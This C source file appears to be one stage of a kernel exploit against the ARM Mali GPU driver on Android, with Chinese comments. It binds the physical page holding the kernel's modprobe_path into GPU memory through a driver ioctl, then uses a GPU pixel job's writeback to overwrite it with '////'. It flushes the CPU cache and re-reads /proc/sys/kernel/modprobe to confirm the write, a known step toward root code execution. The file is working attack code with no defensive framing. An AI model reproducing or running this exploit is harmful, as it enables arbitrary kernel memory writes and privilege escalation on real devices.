/*
 * kort_verify.c - BIND 外部页写入落地验证 (slide=0 单点 + cache 冲刷)
 *
 * 验证链:
 *   1. BIND modprobe_path 页 (slide=0: PA 0x027DF000) -> GPU VA
 *   2. WB 写 "////" 到 modprobe_path
 *   3. 读 /proc/sys/kernel/modprobe (cached)
 *   4. touch 64MB 用户内存冲刷 CPU cache 后再读
 *   5. 打印 job status (SEG_FAULT => MMU 映射问题)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_MEM_ALLOC  0xC0288300
#define MALI_IOC_MEM_BIND   0xC0288302
#define MALI_IOC_PP_START_JOB       0xC1988400
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize;
    uint32_t psize; uint32_t flags;
    uint64_t backend_handle; int32_t secure_shared_fd;
} alloc_mem_s;

typedef struct { uint32_t points[3]; int32_t sync_fd; } mali_uk_fence_t;

typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12];
    uint32_t wb2_registers[12]; uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} pp_start_job_s;

typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR      1
#define FR_FLAGS            3
#define FR_CLEAR_DEPTH      4
#define FR_CLEAR_COLOR_0    6
#define FR_CLEAR_COLOR_1    7
#define FR_CLEAR_COLOR_2    8
#define FR_CLEAR_COLOR_3    9
#define FR_WIDTH           10
#define FR_HEIGHT          11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA           18
#define FR_SCALE           21
#define FR_FOUREIGHT       22
#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_PITCH 5
#define WB_MRT_BITS 6

#define GPU_VA_DATA  0x40000000u
#define GPU_VA_TGT   0x40300000u
#define BUF_SIZE     0x4000

static const uint32_t fragment_shader[] = {
    0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
};
static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }
static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno; alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size,
             fl = 0x800, pa = phys, rights = 0x37;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 24, &pa, 4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

static int wb_write(int fd, uint32_t *buf, uint32_t wb_addr, uint32_t value)
{
    const uint32_t OFF_PLB = 0, OFF_SHADER = 0x80, OFF_RSW = 0x100,
                   OFF_TILEBLK = 0x200, OFF_STACK = 0x1000;
    memset(buf, 0, 0x2000);
    memcpy((uint8_t*)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));
    uint32_t *rsw = (uint32_t*)((uint8_t*)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
    rsw[0x0D] = 0x00000100;
    uint32_t *plb = (uint32_t*)buf;
    plb[0] = 0; plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | (((GPU_VA_DATA + OFF_TILEBLK) >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000; plb[4] = 0; plb[5] = 0xBC000000;

    pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xCAFEBABE;
    job.num_cores = 1;
    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + OFF_PLB;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + OFF_RSW;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = 0x100;
    job.frame_registers[FR_HEIGHT]          = 0x100;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
    job.frame_registers[FR_DUBYA]           = 0x77;
    job.frame_registers[FR_SCALE]           = 0x0C;
    job.frame_registers[FR_FOUREIGHT]       = 0x8888;
    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_PITCH]        = 8;
    job.wb0_registers[WB_MRT_BITS]     = 4;
    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;
    __builtin___clear_cache((char*)buf, (char*)buf + 0x2000);

    if (tio(fd, MALI_IOC_PP_START_JOB, &job, 5) != 0) return -1;
    wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    if (tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5) != 0) return -2;
    if (notif.type == 0x00020010) {
        uint32_t status;
        memcpy(&status, notif.data + 8, 4);
        printf("    [job] status=0x%08x%s%s\n", status,
               (status & (1<<16)) ? " SUCCESS" : "",
               (status & (1<<21)) ? " SEG_FAULT!" : "");
        return (status & (1<<21)) ? -3 : 0;
    }
    return -4;
}

static void read_modprobe(const char *tag) {
    char cur[64] = {0};
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd >= 0) { read(fd, cur, 32); close(fd); }
    printf("  [%s] modprobe: '%s'\n", tag, cur);
}

/* 冲刷 CPU cache: touch 大块内存把内核 data line 逐出 */
static void flush_cpu_cache(void) {
    size_t sz = 64 * 1024 * 1024;
    volatile char *m = mmap(NULL, sz, PROT_READ|PROT_WRITE,
                            MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED) return;
    for (size_t i = 0; i < sz; i += 64) m[i] = (char)i;
    for (size_t i = 0; i < sz; i += 64) m[i] ^= 1;
    munmap((void*)m, sz);
}

int main(int argc, char **argv) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    /* slide 由参数指定, 默认 0 */
    uint32_t slide = (argc > 1) ? strtoul(argv[1], 0, 0) : 0;
    uint32_t modprobe_page = 0x027DF000u + slide;

    printf("[*] kort_verify: BIND page 0x%08x, slide=0x%x\n",
           modprobe_page, slide);

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE; alloc.psize = BUF_SIZE;
    if (tio(fd, MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) { printf("[-] alloc\n"); return 1; }
    void *buf = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { printf("[-] mmap\n"); return 1; }

    read_modprobe("before");

    if (bind_phys(fd, modprobe_page, GPU_VA_TGT, 0x1000) != 0) {
        printf("[-] BIND failed\n"); return 1;
    }
    printf("[+] BIND OK\n");

    printf("[*] WB write '////' (0x2F2F2F2F) to modprobe_path...\n");
    int r = wb_write(fd, (uint32_t*)buf, GPU_VA_TGT + 0x960, 0x2F2F2F2F);
    if (r != 0) printf("[-] wb_write ret=%d\n", r);

    read_modprobe("direct-read");
    printf("[*] flushing CPU cache (touch 64MB)...\n");
    flush_cpu_cache();
    read_modprobe("after-flush");

    printf("[*] flushing again + re-read...\n");
    flush_cpu_cache();
    read_modprobe("after-flush2");

    printf("\n[note] 若 after-flush 显示 ////  => 写入落地, cache 一致性问题确认\n");
    printf("[note] 若始终旧值 => 写入未落地 (检查 logcat -b kernel | grep -i mali)\n");
    return 0;
}
